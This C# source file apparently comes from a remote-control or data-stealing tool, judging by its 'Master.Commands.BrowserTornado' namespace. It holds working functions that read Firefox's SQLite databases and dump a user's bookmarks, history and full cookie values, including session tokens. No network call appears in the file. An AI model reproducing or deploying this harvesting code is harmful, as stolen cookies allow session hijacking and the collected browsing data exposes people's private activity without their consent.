using System;
using System.Collections.Generic;
using System.Data.SQLite;

namespace Master.Commands.BrowserTornado
{
    internal static class Firefox
    {
        /// <summary>
        /// Dump all bookmarks inside the given places database
        /// in the form of an IEnumerable of tuples (string name, string url)
        /// </summary>
        /// <param name="bookmarksPath">Path to the places database</param>
        /// <returns>IEnumerable of bookmarks tuples</returns>
        public static IEnumerable<Tuple<string, string>> DumpBookmarks(string bookmarksPath)
        {
            using (var connection = new SQLiteConnection("Data Source=" + bookmarksPath + ";Version=3;New=False;Compress=True;"))
            {
                connection.Open();

                var query = connection.CreateCommand();
                query.CommandText = "SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks, moz_places WHERE moz_bookmarks.fk = moz_places.id AND moz_bookmarks.title IS NOT NULL;";
                var reader = query.ExecuteReader();

                while (reader.Read())
                {
                    yield return new Tuple<string, string>(reader.GetString(0), reader.GetString(1));
                }
            }
        }

        /// <summary>
        /// Dump all cookies from the given cookie database
        /// </summary>
        /// <param name="cookiesPath">Path to the cookie database</param>
        /// <returns>All cookies in the database in the form of an IEnumerable of CookieItem</returns>
        public static IEnumerable<CookieObject> DumpCookies(string cookiesPath)
        {
            using (var connection = new SQLiteConnection("Data Source=" + cookiesPath + ";Version=3;New=False;Compress=True;"))
            {
                connection.Open();

                var query = connection.CreateCommand();
                query.CommandText = "SELECT name, baseDomain, value FROM moz_cookies;";
                var reader = query.ExecuteReader();

                while (reader.Read())
                {
                    yield return new CookieObject(reader.GetString(0), reader.GetString(1), reader.GetString(2));
                }
            }
        }

        /// <summary>
        /// Dump all urls from the given history database
        /// </summary>
        /// <param name="historyPath">Path to the history database</param>
        /// <returns>All urls from the history database in the form of an IEnumerable of string</returns>
        public static IEnumerable<string> DumpHistory(string historyPath)
        {
            using (var connection = new SQLiteConnection("Data Source=" + historyPath + ";Version=3;New=False;Compress=True;"))
            {
                connection.Open();

                var query = connection.CreateCommand();
                query.CommandText = "SELECT url FROM moz_places, moz_historyvisits WHERE moz_historyvisits.place_id = moz_places.id;";
                var reader = query.ExecuteReader();

                while (reader.Read())
                {
                    yield return reader.GetString(0);
                }
            }
        }
    }
}
